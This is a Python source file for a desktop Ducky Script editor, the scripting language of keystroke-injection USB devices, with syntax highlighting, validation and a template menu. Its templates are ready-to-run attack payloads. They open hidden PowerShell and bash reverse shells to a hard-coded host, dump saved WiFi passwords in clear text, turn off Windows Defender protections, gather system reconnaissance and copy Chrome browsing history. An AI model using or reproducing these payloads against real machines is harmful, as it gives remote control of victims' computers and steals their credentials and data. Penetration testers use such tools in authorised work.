"""
Ducky Script Editor with syntax highlighting and autocomplete
"""

import tkinter as tk
from tkinter import ttk
import customtkinter as ctk
from typing import Dict, List, Optional, Tuple
import re


class DuckyScriptEditor(ctk.CTkFrame):
    """Enhanced text editor for Ducky Script with syntax highlighting"""
    
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        
        # Ducky Script commands and their descriptions
        self.commands = {
            "REM": "Comment - ignored by parser",
            "DELAY": "Delay in milliseconds",
            "STRING": "Type a string of text",
            "ENTER": "Press Enter key",
            "GUI": "Windows/Command key (GUI r = Win+R)",
            "WINDOWS": "Windows key",
            "COMMAND": "Mac Command key", 
            "CTRL": "Control key modifier",
            "ALT": "Alt key modifier",
            "SHIFT": "Shift key modifier",
            "TAB": "Tab key",
            "ESCAPE": "Escape key",
            "ESC": "Escape key (alias)",
            "BACKSPACE": "Backspace key",
            "DELETE": "Delete key",
            "INSERT": "Insert key",
            "HOME": "Home key",
            "END": "End key",
            "PAGEUP": "Page Up key",
            "PAGEDOWN": "Page Down key",
            "UP": "Up arrow",
            "DOWN": "Down arrow", 
            "LEFT": "Left arrow",
            "RIGHT": "Right arrow",
            "UPARROW": "Up arrow (alias)",
            "DOWNARROW": "Down arrow (alias)",
            "LEFTARROW": "Left arrow (alias)",
            "RIGHTARROW": "Right arrow (alias)",
            "F1": "F1 key",
            "F2": "F2 key",
            "F3": "F3 key",
            "F4": "F4 key",
            "F5": "F5 key",
            "F6": "F6 key",
            "F7": "F7 key",
            "F8": "F8 key",
            "F9": "F9 key",
            "F10": "F10 key",
            "F11": "F11 key",
            "F12": "F12 key",
            "SPACE": "Space key",
            "MENU": "Context menu key",
            "APP": "Context menu key (alias)",
            "PRINTSCREEN": "Print Screen key",
            "SCROLLLOCK": "Scroll Lock key",
            "PAUSE": "Pause/Break key",
            "BREAK": "Pause/Break key (alias)",
            "CAPSLOCK": "Caps Lock key",
            "NUMLOCK": "Num Lock key",
            "REPEAT": "Repeat last command N times"
        }
        
        # Color scheme
        self.colors = {
            "bg": "#1e1e1e",
            "fg": "#d4d4d4",
            "comment": "#6a9955",
            "command": "#569cd6",
            "string": "#ce9178",
            "number": "#b5cea8",
            "error": "#f44747",
            "selection": "#264f78",
            "current_line": "#2a2a2a"
        }
        
        self._create_widgets()
        self._setup_tags()
        self._bind_events()
        
    def _create_widgets(self):
        """Create editor widgets"""
        # Toolbar
        toolbar = ctk.CTkFrame(self, fg_color="transparent", height=40)
        toolbar.pack(fill="x", padx=5, pady=5)
        
        # Template dropdown
        self.template_var = tk.StringVar(value="Select Template")
        template_menu = ctk.CTkOptionMenu(
            toolbar,
            values=[
                "Select Template",
                "Windows Reverse Shell",
                "WiFi Password Harvester",
                "Windows Recon",
                "Disable Windows Defender",
                "Linux Reverse Shell",
                "Mac Screenshot",
                "Browser History Dump"
            ],
            variable=self.template_var,
            command=self._load_template,
            width=200
        )
        template_menu.pack(side="left", padx=5)
        
        # Buttons
        validate_btn = ctk.CTkButton(
            toolbar,
            text="Validate",
            command=self._validate_script,
            width=80
        )
        validate_btn.pack(side="left", padx=5)
        
        clear_btn = ctk.CTkButton(
            toolbar,
            text="Clear",
            command=self._clear_editor,
            width=80
        )
        clear_btn.pack(side="left", padx=5)
        
        # Editor frame with line numbers
        editor_frame = ctk.CTkFrame(self)
        editor_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Line numbers
        self.line_numbers = tk.Text(
            editor_frame,
            width=4,
            bg=self.colors["bg"],
            fg="#858585",
            font=("Consolas", 12),
            relief="flat",
            takefocus=0,
            bd=0,
            state="disabled"
        )
        self.line_numbers.pack(side="left", fill="y")
        
        # Main editor
        self.editor = tk.Text(
            editor_frame,
            bg=self.colors["bg"],
            fg=self.colors["fg"],
            insertbackground="white",
            selectbackground=self.colors["selection"],
            font=("Consolas", 12),
            relief="flat",
            bd=0,
            undo=True,
            wrap="none"
        )
        self.editor.pack(side="left", fill="both", expand=True)
        
        # Scrollbar
        scrollbar = ttk.Scrollbar(editor_frame, command=self._sync_scroll)
        scrollbar.pack(side="right", fill="y")
        
        self.editor.config(yscrollcommand=scrollbar.set)
        self.line_numbers.config(yscrollcommand=scrollbar.set)
        
        # Status bar
        self.status_bar = ctk.CTkLabel(
            self,
            text="Ready | Line: 1, Col: 1",
            anchor="w",
            height=25
        )
        self.status_bar.pack(fill="x", padx=5, pady=(0, 5))
        
    def _setup_tags(self):
        """Configure syntax highlighting tags"""
        self.editor.tag_config("comment", foreground=self.colors["comment"])
        self.editor.tag_config("command", foreground=self.colors["command"], font=("Consolas", 12, "bold"))
        self.editor.tag_config("string", foreground=self.colors["string"])
        self.editor.tag_config("number", foreground=self.colors["number"])
        self.editor.tag_config("error", foreground=self.colors["error"], underline=True)
        self.editor.tag_config("current_line", background=self.colors["current_line"])
        
    def _bind_events(self):
        """Bind editor events"""
        self.editor.bind("<KeyRelease>", self._on_key_release)
        self.editor.bind("<ButtonRelease-1>", self._update_cursor_position)
        self.editor.bind("<Control-space>", self._show_autocomplete)
        self.editor.bind("<<Modified>>", self._on_modified)
        self.editor.bind("<MouseWheel>", self._on_mousewheel)
        
    def _sync_scroll(self, *args):
        """Synchronize scrolling between editor and line numbers"""
        self.editor.yview(*args)
        self.line_numbers.yview(*args)
        
    def _on_mousewheel(self, event):
        """Handle mouse wheel scrolling"""
        self.editor.yview_scroll(int(-1*(event.delta/120)), "units")
        self.line_numbers.yview_scroll(int(-1*(event.delta/120)), "units")
        return "break"
        
    def _on_key_release(self, event):
        """Handle key release events"""
        self._highlight_syntax()
        self._update_line_numbers()
        self._update_cursor_position()
        
    def _on_modified(self, event):
        """Handle text modification"""
        if self.editor.edit_modified():
            self._highlight_syntax()
            self._update_line_numbers()
            self.editor.edit_modified(False)
            
    def _highlight_syntax(self):
        """Apply syntax highlighting"""
        # Remove all tags
        for tag in ["comment", "command", "string", "number", "error"]:
            self.editor.tag_remove(tag, "1.0", "end")
            
        # Get all text
        content = self.editor.get("1.0", "end-1c")
        
        # Highlight line by line
        for i, line in enumerate(content.split("\n"), 1):
            line_start = f"{i}.0"
            line_end = f"{i}.end"
            
            # Skip empty lines
            if not line.strip():
                continue
                
            # Comments
            if line.strip().startswith("REM"):
                self.editor.tag_add("comment", line_start, line_end)
                continue
                
            # Parse command
            parts = line.split(None, 1)
            if parts:
                cmd = parts[0].upper()
                cmd_end = f"{i}.{len(parts[0])}"
                
                # Check if valid command
                if cmd in self.commands:
                    self.editor.tag_add("command", line_start, cmd_end)
                    
                    # Highlight parameters
                    if len(parts) > 1:
                        param = parts[1]
                        param_start = f"{i}.{len(parts[0]) + 1}"
                        
                        # Numbers (for DELAY)
                        if cmd == "DELAY" and param.isdigit():
                            self.editor.tag_add("number", param_start, line_end)
                        # Strings
                        elif cmd == "STRING":
                            self.editor.tag_add("string", param_start, line_end)
                        # REPEAT number
                        elif cmd == "REPEAT" and param.isdigit():
                            self.editor.tag_add("number", param_start, line_end)
                else:
                    # Invalid command
                    self.editor.tag_add("error", line_start, cmd_end)
                    
    def _update_line_numbers(self):
        """Update line numbers"""
        self.line_numbers.config(state="normal")
        self.line_numbers.delete("1.0", "end")
        
        # Get number of lines
        lines = self.editor.get("1.0", "end-1c").count("\n") + 1
        
        # Generate line numbers
        line_nums = "\n".join(str(i).rjust(3) for i in range(1, lines + 1))
        self.line_numbers.insert("1.0", line_nums)
        self.line_numbers.config(state="disabled")
        
    def _update_cursor_position(self, event=None):
        """Update cursor position in status bar"""
        position = self.editor.index("insert")
        line, col = position.split(".")
        self.status_bar.configure(text=f"Ready | Line: {line}, Col: {int(col) + 1}")
        
    def _show_autocomplete(self, event):
        """Show autocomplete suggestions"""
        # Get current word
        current_pos = self.editor.index("insert")
        line_start = current_pos.split(".")[0] + ".0"
        line_text = self.editor.get(line_start, current_pos)
        
        # Extract current word
        words = line_text.split()
        if not words:
            current_word = ""
        else:
            current_word = words[-1].upper()
            
        # Find matching commands
        matches = [cmd for cmd in self.commands if cmd.startswith(current_word)]
        
        if matches and current_word:
            # For now, just insert the first match
            # In a full implementation, show a dropdown
            completion = matches[0][len(current_word):]
            self.editor.insert("insert", completion)
            
    def _validate_script(self):
        """Validate the Ducky Script"""
        content = self.editor.get("1.0", "end-1c")
        errors = []
        
        for i, line in enumerate(content.split("\n"), 1):
            line = line.strip()
            if not line or line.startswith("REM"):
                continue
                
            parts = line.split(None, 1)
            if not parts:
                continue
                
            cmd = parts[0].upper()
            
            # Check valid command
            if cmd not in self.commands:
                errors.append(f"Line {i}: Unknown command '{cmd}'")
                continue
                
            # Validate parameters
            if cmd == "DELAY":
                if len(parts) < 2 or not parts[1].isdigit():
                    errors.append(f"Line {i}: DELAY requires numeric parameter")
            elif cmd == "REPEAT":
                if len(parts) < 2 or not parts[1].isdigit():
                    errors.append(f"Line {i}: REPEAT requires numeric parameter")
            elif cmd == "STRING":
                if len(parts) < 2:
                    errors.append(f"Line {i}: STRING requires text parameter")
                    
        if errors:
            self.status_bar.configure(
                text=f"Validation failed: {len(errors)} error(s) found - {errors[0]}"
            )
        else:
            self.status_bar.configure(text="Validation passed! Script is ready to deploy.")
            
    def _clear_editor(self):
        """Clear the editor"""
        self.editor.delete("1.0", "end")
        self._update_line_numbers()
        self.status_bar.configure(text="Ready | Line: 1, Col: 1")
        
    def _load_template(self, template_name: str):
        """Load a Ducky Script template"""
        templates = {
            "Windows Reverse Shell": """REM Windows PowerShell Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);
ENTER
STRING $stream = $client.GetStream();
ENTER
STRING [byte[]]$bytes = 0..65535|%{0};
ENTER
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
ENTER
STRING $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
ENTER
STRING $sendback = (iex $data 2>&1 | Out-String);
ENTER
STRING $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
ENTER
STRING $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
ENTER
STRING $stream.Write($sendbyte,0,$sendbyte.Length);
ENTER
STRING $stream.Flush()};
ENTER
STRING $client.Close()
ENTER""",

            "WiFi Password Harvester": """REM Harvest WiFi passwords and save to file
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING cd %USERPROFILE%\\Desktop
ENTER
STRING netsh wlan show profiles > wifi_profiles.txt
ENTER
DELAY 500
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr /c:"All User Profile"') do (for /f "tokens=*" %b in ("%a") do netsh wlan show profile name="%b" key=clear >> wifi_passwords.txt)
ENTER
DELAY 3000
STRING exit
ENTER""",

            "Windows Recon": """REM Windows System Reconnaissance
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt
ENTER
DELAY 2000
STRING ipconfig /all >> %USERPROFILE%\\Desktop\\sysinfo.txt
ENTER
DELAY 1000
STRING net user >> %USERPROFILE%\\Desktop\\sysinfo.txt
ENTER
DELAY 1000
STRING net localgroup administrators >> %USERPROFILE%\\Desktop\\sysinfo.txt
ENTER
DELAY 1000
STRING netstat -an >> %USERPROFILE%\\Desktop\\sysinfo.txt
ENTER
DELAY 1000
STRING exit
ENTER""",

            "Disable Windows Defender": """REM Disable Windows Defender (Admin required)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass Start-Process powershell -Verb RunAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING Set-MpPreference -DisableBehaviorMonitoring $true
ENTER
DELAY 500
STRING Set-MpPreference -DisableIOAVProtection $true
ENTER
DELAY 500
STRING Set-MpPreference -DisableScriptScanning $true
ENTER
DELAY 500
STRING exit
ENTER""",

            "Linux Reverse Shell": """REM Linux Bash Reverse Shell
DELAY 1000
CTRL ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &
ENTER
DELAY 500
STRING disown
ENTER
DELAY 500
STRING exit
ENTER""",

            "Mac Screenshot": """REM Mac Screenshot to Desktop
DELAY 1000
COMMAND SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING screencapture -x ~/Desktop/screenshot_$(date +%Y%m%d_%H%M%S).png
ENTER
DELAY 500
STRING exit
ENTER""",

            "Browser History Dump": """REM Dump Chrome Browser History
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING cd %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default
ENTER
STRING copy History %USERPROFILE%\\Desktop\\chrome_history.db
ENTER
DELAY 1000
STRING exit
ENTER"""
        }
        
        if template_name in templates:
            self._clear_editor()
            self.editor.insert("1.0", templates[template_name])
            self._highlight_syntax()
            self._update_line_numbers()
            
    def get_script(self) -> str:
        """Get the current script content"""
        return self.editor.get("1.0", "end-1c")
        
    def set_script(self, script: str):
        """Set the script content"""
        self._clear_editor()
        self.editor.insert("1.0", script)
        self._highlight_syntax()
        self._update_line_numbers()